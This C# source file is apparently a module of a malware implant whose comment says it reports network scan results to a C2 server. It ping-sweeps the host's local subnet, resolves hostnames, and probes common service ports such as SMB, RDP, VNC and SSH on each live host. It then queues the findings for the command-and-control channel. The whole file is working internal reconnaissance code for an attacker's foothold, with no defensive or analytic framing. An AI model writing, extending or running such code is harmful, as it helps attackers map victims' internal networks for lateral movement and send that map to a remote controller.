using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;

namespace XYZ.modules.reporters
{
    /// <summary>
    /// Reports network scan results to C2
    /// </summary>
    public class NetworkScanReporter
    {
        public const string REPORT_TYPE = "network_scan";

        /// <summary>
        /// Report a completed network scan
        /// </summary>
        public static void Report(string scanType, string targetRange, 
            List<Dictionary<string, object>> discoveredHosts, 
            List<Dictionary<string, object>> openPorts,
            int durationMs)
        {
            var data = new Dictionary<string, object>
            {
                { "scan_type", scanType },
                { "target_range", targetRange },
                { "discovered_hosts", discoveredHosts },
                { "open_ports", openPorts },
                { "hosts_found", discoveredHosts.Count },
                { "duration_ms", durationMs },
                { "started_at", DateTime.UtcNow.AddMilliseconds(-durationMs).ToString("o") },
                { "completed_at", DateTime.UtcNow.ToString("o") }
            };

            TelemetryAggregator.QueueReport(REPORT_TYPE, data);

            SecureLogger.LogInfo("NetworkScanReporter",
                string.Format("Network scan [{0}] completed: {1} hosts found in {2}ms", 
                    scanType, discoveredHosts.Count, durationMs));
        }

        /// <summary>
        /// Perform a quick ARP scan of the local network and report results
        /// </summary>
        public static void ScanAndReportLocalNetwork()
        {
            DateTime startTime = DateTime.Now;
            var discoveredHosts = new List<Dictionary<string, object>>();
            var openPorts = new List<Dictionary<string, object>>();

            try
            {
                // Get local network info
                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP)) return;

                string[] ipParts = localIP.Split('.');
                string subnet = string.Format("{0}.{1}.{2}", ipParts[0], ipParts[1], ipParts[2]);

                // Ping sweep (simplified)
                for (int i = 1; i <= 254; i++)
                {
                    string targetIP = string.Format("{0}.{1}", subnet, i);
                    try
                    {
                        using (Ping ping = new Ping())
                        {
                            PingReply reply = ping.Send(targetIP, 100);
                            if (reply.Status == IPStatus.Success)
                            {
                                var host = new Dictionary<string, object>
                                {
                                    { "ip", targetIP },
                                    { "response_time_ms", reply.RoundtripTime },
                                    { "ttl", reply.Options != null ? reply.Options.Ttl : 0 }
                                };

                                // Try to get hostname
                                try
                                {
                                    IPHostEntry hostEntry = Dns.GetHostEntry(targetIP);
                                    host["hostname"] = hostEntry.HostName;
                                }
                                catch { }

                                discoveredHosts.Add(host);
                            }
                        }
                    }
                    catch { }
                }

                // Quick port scan on discovered hosts (common ports only)
                int[] commonPorts = { 21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5900, 8080 };
                foreach (var host in discoveredHosts)
                {
                    string ip = host["ip"].ToString();
                    foreach (int port in commonPorts)
                    {
                        try
                        {
                            using (TcpClient client = new TcpClient())
                            {
                                IAsyncResult result = client.BeginConnect(ip, port, null, null);
                                bool connected = result.AsyncWaitHandle.WaitOne(100, false);
                                if (connected && client.Connected)
                                {
                                    openPorts.Add(new Dictionary<string, object>
                                    {
                                        { "ip", ip },
                                        { "port", port },
                                        { "service", GetServiceName(port) }
                                    });
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("NetworkScanReporter", ex);
            }

            int durationMs = (int)(DateTime.Now - startTime).TotalMilliseconds;
            string localNetwork = GetLocalIPAddress();
            string targetRange = !string.IsNullOrEmpty(localNetwork) ? 
                localNetwork.Substring(0, localNetwork.LastIndexOf('.')) + ".0/24" : "Unknown";

            Report("arp_and_port", targetRange, discoveredHosts, openPorts, durationMs);
        }

        private static string GetLocalIPAddress()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return ip.Address.ToString();
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private static string GetServiceName(int port)
        {
            switch (port)
            {
                case 21: return "FTP";
                case 22: return "SSH";
                case 23: return "Telnet";
                case 25: return "SMTP";
                case 80: return "HTTP";
                case 135: return "RPC";
                case 139: return "NetBIOS";
                case 443: return "HTTPS";
                case 445: return "SMB";
                case 3389: return "RDP";
                case 5900: return "VNC";
                case 8080: return "HTTP-ALT";
                default: return "Unknown";
            }
        }
    }
}
